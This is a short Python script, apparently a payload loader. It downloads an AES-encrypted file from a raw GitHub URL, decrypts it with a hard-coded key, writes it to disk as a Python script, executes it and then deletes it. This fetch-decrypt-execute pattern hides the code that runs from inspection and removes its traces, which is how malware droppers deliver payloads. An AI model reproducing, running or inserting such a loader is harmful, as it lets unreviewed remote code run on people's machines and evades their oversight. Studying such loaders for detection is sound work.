import requests
import subprocess
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# --- CONFIGURATION & PLACEHOLDERS ---
# Key and IV must be bytes. 
# AES-256 requires a 32-byte key; AES-128 requires 16 bytes.
AES_KEY = b'your-32-byte-long-secret-key-!!!' # Placeholder
AES_IV  = b'16-byte-IV-here!'                # Placeholder

def decrypt_and_run(url, encrypted_file, decrypted_file):
    try:
        # 1. Download the encrypted script
        print(f"Downloading encrypted file from {url}...")
        response = requests.get(url)
        response.raise_for_status()
        encrypted_data = response.content

        # 2. Decrypt the data
        print("Decrypting script...")
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        
        # Decrypt and remove padding (standard for AES block sizes)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

        # 3. Save the decrypted script locally
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_data)
        
        # 4. Execute the decrypted script
        print(f"Executing {decrypted_file}...\n" + "-"*20)
        result = subprocess.run([sys.executable, decrypted_file], capture_output=True, text=True)
        
        print("Output:\n", result.stdout)
        if result.stderr:
            print("Errors:\n", result.stderr)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Optional: Delete the decrypted file after running for security
        if os.path.exists(decrypted_file):
            os.remove(decrypted_file)
            print(f"\nCleaned up: {decrypted_file} removed.")

# Example Usage
if __name__ == "__main__":
    URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
    ENC_FILENAME = "payload.enc"
    DEC_FILENAME = "recovered_script.py"
    
    decrypt_and_run(URL, ENC_FILENAME, DEC_FILENAME)
